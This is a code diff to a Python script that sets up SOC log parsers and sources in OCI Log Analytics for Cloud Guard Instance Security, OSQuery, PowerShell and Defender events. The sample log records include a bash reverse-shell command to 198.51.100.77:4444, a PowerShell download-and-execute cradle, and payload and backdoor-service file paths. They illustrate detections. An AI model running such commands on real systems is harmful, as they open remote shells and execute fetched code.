@@ -122,6 +122,18 @@ CUSTOM_FIELDS = [
     "Object Server",
     "Object Type",
     "Properties",
+    "Object Name",
+    "Access Mask",
+    "Failure Reason",
+    "Sub Status",
+    "Task Name",
+    "Share Name",
+    "Relative Target Name",
+    "Service File Name",
+    "Script Block Text",
+    "Host Application",
+    "Threat ID",
+    "Detection Source",
     # Sysmon Network / MITRE fields
     "Account Name",
     "RuleName",
@@ -224,6 +236,15 @@ CUSTOM_FIELDS = [
     "OSQuery Finding",
     "OSQuery SQL",
     "OSQuery Result Count",
+    "Pack Name",
+    "Pack Query ID",
+    "Pack Query Name",
+    "Finding ID",
+    "Finding Name",
+    "Finding Status",
+    "Finding Severity",
+    "Instance Security Problem ID",
+    "Instance Security Rule ID",
     "Instance OCID",
     "Host Role",
     "Compromised VM",
@@ -529,6 +550,95 @@ CG_SOURCE_DESC = (
 )
 
 
+# ─── Cloud Guard Instance Security / OSQuery Result Parser ───────
+
+CGIS_PARSER_NAME = "socCloudGuardInstanceSecurityJsonParser"
+CGIS_PARSER_DISPLAY = "SOC Cloud Guard Instance Security JSON Parser"
+CGIS_PARSER_DESC = (
+    "Parses Cloud Guard Instance Security and OSQuery result logs. "
+    "Keeps workload host findings separate from Cloud Guard problem events and Octo APM demo telemetry."
+)
+CGIS_FIELD_MAPPINGS = [
+    ("msg",                         "$.message",              1),
+    ("time",                        "$.timestamp",            2),
+    ("Host Name",                   "$.hostname",             3),
+    ("Instance OCID",               "$.instanceOcid",         4),
+    ("Instance OCID",               "$.cloud.instance.id",    5),
+    ("Region",                      "$.region",               6),
+    ("Risk Level",                  "$.riskLevel",            7),
+    ("Security Severity",           "$.severity",             8),
+    ("Finding Severity",            "$.severity",             9),
+    ("Finding Status",              "$.status",              10),
+    ("Finding ID",                  "$.findingId",           11),
+    ("Finding Name",                "$.findingName",         12),
+    ("Instance Security Problem ID", "$.problemId",          13),
+    ("Instance Security Rule ID",   "$.ruleId",              14),
+    ("Pack Name",                   "$.pack.name",           15),
+    ("Pack Query ID",               "$.pack.query_id",       16),
+    ("Pack Query Name",             "$.pack.query_name",     17),
+    ("OSQuery Query",               "$.osquery.query",       18),
+    ("OSQuery SQL",                 "$.osquery.sql",         19),
+    ("OSQuery Finding",             "$.osquery.finding",     20),
+    ("OSQuery Result Count",        "$.osquery.result_count", 21),
+    ("Process Name",                "$.process.name",        22),
+    ("Process Command Line",        "$.process.command_line", 23),
+    ("File Path",                   "$.file.path",           24),
+    ("Source IP",                   "$.source.ip",           25),
+    ("Destination IP",              "$.destination.ip",      26),
+    ("Destination Port",            "$.destination.port",    27),
+    ("MITRE Tactic",                "$.mitre.tactic",        28),
+    ("MITRE Technique ID",          "$.mitre.technique_id",  29),
+    ("MITRE Technique",             "$.mitre.technique",     30),
+    ("Log Type",                    "$.logType",             31),
+]
+CGIS_EXAMPLE = {
+    "timestamp": "2026-05-28T10:30:00.000Z",
+    "message": "OSQuery detected a suspicious listening process on an OCI compute instance",
+    "hostname": "oke-worker-01",
+    "instanceOcid": "ocid1.instance.oc1..example",
+    "cloud.instance.id": "ocid1.instance.oc1..example",
+    "region": "us-ashburn-1",
+    "riskLevel": "HIGH",
+    "severity": "critical",
+    "status": "open",
+    "findingId": "finding-osquery-listener-001",
+    "findingName": "Unexpected Listener",
+    "problemId": "cgis-problem-001",
+    "ruleId": "cgis-rule-osquery-unexpected-listener",
+    "pack": {
+        "name": "network-exposure",
+        "query_id": "unexpected_listeners",
+        "query_name": "Unexpected listeners",
+    },
+    "osquery": {
+        "query": "unexpected_listeners",
+        "sql": "SELECT pid, port, protocol FROM listening_ports;",
+        "finding": "Process bash opened a listener on 0.0.0.0:4444",
+        "result_count": 1,
+    },
+    "process": {
+        "name": "bash",
+        "command_line": "bash -i >& /dev/tcp/198.51.100.77/4444 0>&1",
+    },
+    "file": {"path": "/tmp/boopkit"},
+    "source": {"ip": "10.0.10.42"},
+    "destination": {"ip": "198.51.100.77", "port": 4444},
+    "mitre": {"tactic": "Command and Control", "technique_id": "T1095", "technique": "Non-Application Layer Protocol"},
+    "logType": "cloud_guard_instance_security",
+}
+
+CGIS_SOURCE_INTERNAL = "socCloudGuardInstanceSecuritySource"
+CGIS_SOURCE_DISPLAY = "SOC Cloud Guard Instance Security Logs"
+CGIS_SOURCE_DESC = (
+    "Cloud Guard Instance Security and OSQuery result logs for workload runtime posture and host findings."
+)
+OSQUERY_SOURCE_INTERNAL = "socOsqueryResultSource"
+OSQUERY_SOURCE_DISPLAY = "SOC OSQuery Result Logs"
+OSQUERY_SOURCE_DESC = (
+    "OSQuery pack result logs for endpoint state findings. Raw OSQuery SQL is not executed by Log Analytics."
+)
+
+
 # ─── Windows Event Security Parser (multicloudoperations compat) ─
 
 WINSEC_PARSER_NAME = "socWinEventSecurityJsonParser"
@@ -566,6 +676,15 @@ WINSEC_FIELD_MAPPINGS = [
     ("Object Server",           "$.ObjectServer",          21),
     ("Object Type",             "$.ObjectType",            22),
     ("Properties",              "$.Properties",            23),
+    ("Object Name",             "$.ObjectName",            24),
+    ("Access Mask",             "$.AccessMask",            25),
+    ("Failure Reason",          "$.FailureReason",         26),
+    ("Status",                  "$.Status",                27),
+    ("Sub Status",              "$.SubStatus",             28),
+    ("Task Name",               "$.TaskName",              29),
+    ("Share Name",              "$.ShareName",             30),
+    ("Relative Target Name",    "$.RelativeTargetName",    31),
+    ("Service File Name",       "$.ServiceFileName",       32),
 ]
 WINSEC_EXAMPLE = {
     "EventID": "4769",
@@ -583,6 +702,15 @@ WINSEC_EXAMPLE = {
     "PrivilegeList": "SeSecurityPrivilege",
     "TargetServerName": "sql01.sevenkingdoms.local",
     "ServiceInformation": "MSSQLSvc/sql01.sevenkingdoms.local",
+    "ObjectName": "\\\\DC01\\C$\\Windows\\Temp\\payload.exe",
+    "AccessMask": "0x12019f",
+    "FailureReason": "0xC000006D",
+    "Status": "0xC000006D",
+    "SubStatus": "0xC000006A",
+    "TaskName": "\\Microsoft\\Windows\\Update\\CacheTask",
+    "ShareName": "\\\\*\\C$",
+    "RelativeTargetName": "Windows\\Temp\\payload.exe",
+    "ServiceFileName": "C:\\Windows\\Temp\\payload.exe",
     "SourceAddress": "192.168.1.50",
     "LogonType": "3",
     "ProcessName": "C:\\Windows\\System32\\lsass.exe",
@@ -613,6 +741,7 @@ WINSYS_FIELD_MAPPINGS = [
     ("Host Name",            "$.Computer",         5),
     ("Service Name",         "$.ServiceName",      6),
     ("User",                 "$.User",             7),
+    ("Service File Name",    "$.ServiceFileName",  8),
 ]
 WINSYS_EXAMPLE = {
     "EventID": "7045",
@@ -621,6 +750,7 @@ WINSYS_EXAMPLE = {
     "Channel": "System",
     "Provider": "Service Control Manager",
     "ServiceName": "backdoor_svc",
+    "ServiceFileName": "C:\\Windows\\Temp\\agent.exe",
     "User": "SYSTEM",
     "msg": "A service was installed in the system.",
 }
@@ -629,6 +759,96 @@ WINSYS_SOURCE_INTERNAL = "socWinEventSystemSource"
 WINSYS_SOURCE_DISPLAY = "Windows Event System Logs"
 WINSYS_SOURCE_DESC = (
     "Windows System Event Log events in JSON format for SOC and multicloud widgets."
+)
+
+
+# ─── Windows PowerShell Operational Parser ──────────────────────
+
+WINPS_PARSER_NAME = "socWinPowerShellOperationalJsonParser"
+WINPS_PARSER_DISPLAY = "SOC Windows PowerShell Operational JSON Parser"
+WINPS_PARSER_DESC = (
+    "Parses Microsoft-Windows-PowerShell/Operational JSON events for script block and module logging detections."
+)
+WINPS_FIELD_MAPPINGS = [
+    ("msg",                    "$.msg",              1),
+    ("time",                   "$.TimeCreated",      2),
+    ("Event ID",               "$.EventID",          3),
+    ("Host Name (Server)",     "$.Computer",         4),
+    ("Host Name",              "$.Computer",         5),
+    ("User",                   "$.User",             6),
+    ("Provider",               "$.Provider",         7),
+    ("Channel",                "$.Channel",          8),
+    ("Script Block Text",      "$.ScriptBlockText",  9),
+    ("Command Line",           "$.CommandLine",     10),
+    ("Host Application",       "$.HostApplication", 11),
+    ("Process Name",           "$.ProcessName",     12),
+]
+WINPS_EXAMPLE = {
+    "EventID": "4104",
+    "TimeCreated": "2026-05-29T10:30:00.000Z",
+    "Computer": "WS01.sevenkingdoms.local",
+    "Channel": "Microsoft-Windows-PowerShell/Operational",
+    "Provider": "Microsoft-Windows-PowerShell",
+    "User": "arya",
+    "ScriptBlockText": "IEX(New-Object Net.WebClient).DownloadString('https://example.invalid/stage.ps1')",
+    "CommandLine": "powershell.exe -NoProfile -ExecutionPolicy Bypass",
+    "HostApplication": "powershell.exe -NoProfile -ExecutionPolicy Bypass",
+    "ProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "msg": "Suspicious PowerShell script block logged.",
+}
+
+WINPS_SOURCE_INTERNAL = "socWinPowerShellOperationalSource"
+WINPS_SOURCE_DISPLAY = "Windows PowerShell Operational Logs"
+WINPS_SOURCE_DESC = (
+    "PowerShell operational script block and module logging events in JSON format for SOC detections."
+)
+
+
+# ─── Windows Defender Operational Parser ────────────────────────
+
+WINDEF_PARSER_NAME = "socWindowsDefenderOperationalJsonParser"
+WINDEF_PARSER_DISPLAY = "SOC Windows Defender Operational JSON Parser"
+WINDEF_PARSER_DESC = (
+    "Parses Microsoft-Windows-Windows Defender/Operational JSON events for malware, remediation, and tamper signals."
+)
+WINDEF_FIELD_MAPPINGS = [
+    ("msg",                    "$.msg",              1),
+    ("time",                   "$.TimeCreated",      2),
+    ("Event ID",               "$.EventID",          3),
+    ("Host Name (Server)",     "$.Computer",         4),
+    ("Host Name",              "$.Computer",         5),
+    ("User",                   "$.User",             6),
+    ("Provider",               "$.Provider",         7),
+    ("Channel",                "$.Channel",          8),
+    ("Threat Name",            "$.ThreatName",       9),
+    ("Threat ID",              "$.ThreatID",        10),
+    ("Action",                 "$.Action",          11),
+    ("Status",                 "$.Status",          12),
+    ("Severity",               "$.Severity",        13),
+    ("Detection Source",       "$.DetectionSource", 14),
+    ("File Path",              "$.FilePath",        15),
+]
+WINDEF_EXAMPLE = {
+    "EventID": "1116",
+    "TimeCreated": "2026-05-29T10:35:00.000Z",
+    "Computer": "WS02.sevenkingdoms.local",
+    "Channel": "Microsoft-Windows-Windows Defender/Operational",
+    "Provider": "Microsoft-Windows-Windows Defender",
+    "User": "SYSTEM",
+    "ThreatName": "Trojan:Win32/Example",
+    "ThreatID": "2147712345",
+    "Action": "Detected",
+    "Status": "Active",
+    "Severity": "High",
+    "DetectionSource": "Real-Time Protection",
+    "FilePath": "C:\\Users\\Public\\stage.exe",
+    "msg": "Microsoft Defender Antivirus detected malware.",
+}
+
+WINDEF_SOURCE_INTERNAL = "socWindowsDefenderOperationalSource"
+WINDEF_SOURCE_DISPLAY = "Windows Defender Operational Logs"
+WINDEF_SOURCE_DESC = (
+    "Microsoft Defender Antivirus operational events in JSON format for SOC detections."
 )
 
 
@@ -1551,6 +1771,13 @@ APP_SOURCE_DESC = (
     "Used by the Application 360 and browser attack dashboards."
 )
 
+AZURE_CUSTOM_SOURCE_INTERNAL = "azureLogAnalyticsCustomSource"
+AZURE_CUSTOM_SOURCE_DISPLAY = "Azure Log Analytics Custom Logs"
+AZURE_CUSTOM_SOURCE_DESC = (
+    "Azure Log Analytics custom-table records migrated from Microsoft Sentinel "
+    "workspaces for Phase A Azure-as-is detection validation."
+)
+
 
 # ─── OCI VCN Flow Log Parser ──────────────────────────────────
 
@@ -1747,6 +1974,8 @@ HEALTH_SOURCE_DESC = (
 # If a SOC source already exists, it is still retained/updated for compatibility.
 NATIVE_SOURCE_ALTERNATIVES = {
     CG_SOURCE_DISPLAY: ["OCI Cloud Guard Problems", "OCI Cloud Guard Logs"],
+    CGIS_SOURCE_DISPLAY: ["OCI Cloud Guard Instance Security Logs"],
+    OSQUERY_SOURCE_DISPLAY: [],
     WINDOWS_SOURCE_DISPLAY: ["Windows Sysmon Events", "Windows Sysmon Operational Logs"],
     LINUX_SOURCE_DISPLAY: [],
     WINSEC_SOURCE_DISPLAY: [],
@@ -1758,6 +1987,7 @@ NATIVE_SOURCE_ALTERNATIVES = {
     LB_SOURCE_DISPLAY: ["OCI Load Balancer Access Logs"],
     WEBAPP_SOURCE_DISPLAY: [],
     APP_SOURCE_DISPLAY: [],
+    AZURE_CUSTOM_SOURCE_DISPLAY: [],
     VCN_SOURCE_DISPLAY: ["OCI VCN Flow Logs", "VCN Flow Logs"],
     FW_SOURCE_DISPLAY: ["OCI Network Firewall Logs", "Network Firewall Logs"],
     HEALTH_SOURCE_DISPLAY: [],
@@ -2341,13 +2571,17 @@ def main():
             print(f"  1 JSON parser: {APP_PARSER_DISPLAY} ({len(field_mappings)} field maps)")
             print(f"  1 log source: {APP_SOURCE_DISPLAY} ({APP_SOURCE_INTERNAL})")
             return
-        print(f"  15 JSON parsers")
-        print(f"  up to 15 log sources (SOC sources skipped when native equivalent exists):")
+        print(f"  18 JSON parsers")
+        print(f"  up to 20 log sources (SOC sources skipped when native equivalent exists):")
         print(f"    - {LINUX_SOURCE_DISPLAY} ({LINUX_SOURCE_INTERNAL})")
         print(f"    - {WINDOWS_SOURCE_DISPLAY} ({WINDOWS_SOURCE_INTERNAL})")
         print(f"    - {CG_SOURCE_DISPLAY} ({CG_SOURCE_INTERNAL})")
+        print(f"    - {CGIS_SOURCE_DISPLAY} ({CGIS_SOURCE_INTERNAL})")
+        print(f"    - {OSQUERY_SOURCE_DISPLAY} ({OSQUERY_SOURCE_INTERNAL})")
         print(f"    - {WINSEC_SOURCE_DISPLAY} ({WINSEC_SOURCE_INTERNAL})")
         print(f"    - {WINSYS_SOURCE_DISPLAY} ({WINSYS_SOURCE_INTERNAL})")
+        print(f"    - {WINPS_SOURCE_DISPLAY} ({WINPS_SOURCE_INTERNAL})")
+        print(f"    - {WINDEF_SOURCE_DISPLAY} ({WINDEF_SOURCE_INTERNAL})")
         print(f"    - {LINSEC_SOURCE_DISPLAY} ({LINSEC_SOURCE_INTERNAL})")
         print(f"    - {SYSMON_SOURCE_DISPLAY} ({SYSMON_SOURCE_INTERNAL})")
         print(f"    - {SYSNET_SOURCE_DISPLAY} ({SYSNET_SOURCE_INTERNAL})")
@@ -2355,6 +2589,7 @@ def main():
         print(f"    - {LB_SOURCE_DISPLAY} ({LB_SOURCE_INTERNAL})")
         print(f"    - {WEBAPP_SOURCE_DISPLAY} ({WEBAPP_SOURCE_INTERNAL})")
         print(f"    - {APP_SOURCE_DISPLAY} ({APP_SOURCE_INTERNAL})")
+        print(f"    - {AZURE_CUSTOM_SOURCE_DISPLAY} ({AZURE_CUSTOM_SOURCE_INTERNAL})")
         print(f"    - {VCN_SOURCE_DISPLAY} ({VCN_SOURCE_INTERNAL})")
         print(f"    - {FW_SOURCE_DISPLAY} ({FW_SOURCE_INTERNAL})")
         print(f"    - {HEALTH_SOURCE_DISPLAY} ({HEALTH_SOURCE_INTERNAL})")
@@ -2445,6 +2680,11 @@ def main():
                   CG_PARSER_NAME, CG_PARSER_DISPLAY, CG_PARSER_DESC,
                   CG_FIELD_MAPPINGS, field_map, CG_EXAMPLE)
 
+    print("\n--- Cloud Guard Instance Security Parser ---")
+    create_parser(la_client, namespace,
+                  CGIS_PARSER_NAME, CGIS_PARSER_DISPLAY, CGIS_PARSER_DESC,
+                  CGIS_FIELD_MAPPINGS, field_map, CGIS_EXAMPLE)
+
     print("\n--- Windows Event Security Parser ---")
     create_parser(la_client, namespace,
                   WINSEC_PARSER_NAME, WINSEC_PARSER_DISPLAY, WINSEC_PARSER_DESC,
@@ -2454,6 +2694,16 @@ def main():
     create_parser(la_client, namespace,
                   WINSYS_PARSER_NAME, WINSYS_PARSER_DISPLAY, WINSYS_PARSER_DESC,
                   WINSYS_FIELD_MAPPINGS, field_map, WINSYS_EXAMPLE)
+
+    print("\n--- Windows PowerShell Operational Parser ---")
+    create_parser(la_client, namespace,
+                  WINPS_PARSER_NAME, WINPS_PARSER_DISPLAY, WINPS_PARSER_DESC,
+                  WINPS_FIELD_MAPPINGS, field_map, WINPS_EXAMPLE)
+
+    print("\n--- Windows Defender Operational Parser ---")
+    create_parser(la_client, namespace,
+                  WINDEF_PARSER_NAME, WINDEF_PARSER_DISPLAY, WINDEF_PARSER_DESC,
+                  WINDEF_FIELD_MAPPINGS, field_map, WINDEF_EXAMPLE)
 
     print("\n--- Linux Secure Parser ---")
     create_parser(la_client, namespace,
@@ -2536,6 +2786,16 @@ def main():
         CG_SOURCE_INTERNAL, CG_SOURCE_DISPLAY, CG_SOURCE_DESC, CG_PARSER_NAME
     )
 
+    print("\n--- Cloud Guard Instance Security Source ---")
+    create_source_if_needed(
+        CGIS_SOURCE_INTERNAL, CGIS_SOURCE_DISPLAY, CGIS_SOURCE_DESC, CGIS_PARSER_NAME
+    )
+
+    print("\n--- OSQuery Result Source ---")
+    create_source_if_needed(
+        OSQUERY_SOURCE_INTERNAL, OSQUERY_SOURCE_DISPLAY, OSQUERY_SOURCE_DESC, CGIS_PARSER_NAME
+    )
+
     print("\n--- Windows Event Security Source ---")
     create_source_if_needed(
         WINSEC_SOURCE_INTERNAL, WINSEC_SOURCE_DISPLAY, WINSEC_SOURCE_DESC, WINSEC_PARSER_NAME
@@ -2544,6 +2804,16 @@ def main():
     print("\n--- Windows Event System Source ---")
     create_source_if_needed(
         WINSYS_SOURCE_INTERNAL, WINSYS_SOURCE_DISPLAY, WINSYS_SOURCE_DESC, WINSYS_PARSER_NAME
+    )
+
+    print("\n--- Windows PowerShell Operational Source ---")
+    create_source_if_needed(
+        WINPS_SOURCE_INTERNAL, WINPS_SOURCE_DISPLAY, WINPS_SOURCE_DESC, WINPS_PARSER_NAME
+    )
+
+    print("\n--- Windows Defender Operational Source ---")
+    create_source_if_needed(
+        WINDEF_SOURCE_INTERNAL, WINDEF_SOURCE_DISPLAY, WINDEF_SOURCE_DESC, WINDEF_PARSER_NAME
     )
 
     print("\n--- Linux Secure Source ---")
@@ -2581,6 +2851,11 @@ def main():
         APP_SOURCE_INTERNAL, APP_SOURCE_DISPLAY, APP_SOURCE_DESC, APP_PARSER_NAME
     )
 
+    print("\n--- Azure Log Analytics Custom Source ---")
+    create_source_if_needed(
+        AZURE_CUSTOM_SOURCE_INTERNAL, AZURE_CUSTOM_SOURCE_DISPLAY, AZURE_CUSTOM_SOURCE_DESC, APP_PARSER_NAME
+    )
+
     print("\n--- VCN Flow Source ---")
     create_source_if_needed(
         VCN_SOURCE_INTERNAL, VCN_SOURCE_DISPLAY, VCN_SOURCE_DESC, VCN_PARSER_NAME
@@ -2603,8 +2878,12 @@ def main():
     print(f"  - {LINUX_SOURCE_DISPLAY}")
     print(f"  - {WINDOWS_SOURCE_DISPLAY}")
     print(f"  - {CG_SOURCE_DISPLAY}")
+    print(f"  - {CGIS_SOURCE_DISPLAY}")
+    print(f"  - {OSQUERY_SOURCE_DISPLAY}")
     print(f"  - {WINSEC_SOURCE_DISPLAY}")
     print(f"  - {WINSYS_SOURCE_DISPLAY}")
+    print(f"  - {WINPS_SOURCE_DISPLAY}")
+    print(f"  - {WINDEF_SOURCE_DISPLAY}")
     print(f"  - {LINSEC_SOURCE_DISPLAY}")
     print(f"  - {SYSMON_SOURCE_DISPLAY}")
     print(f"  - {SYSNET_SOURCE_DISPLAY}")
@@ -2612,6 +2891,7 @@ def main():
     print(f"  - {LB_SOURCE_DISPLAY}")
     print(f"  - {WEBAPP_SOURCE_DISPLAY}")
     print(f"  - {APP_SOURCE_DISPLAY}")
+    print(f"  - {AZURE_CUSTOM_SOURCE_DISPLAY}")
     print(f"  - {VCN_SOURCE_DISPLAY}")
     print(f"  - {FW_SOURCE_DISPLAY}")
     print(f"  - {HEALTH_SOURCE_DISPLAY}")
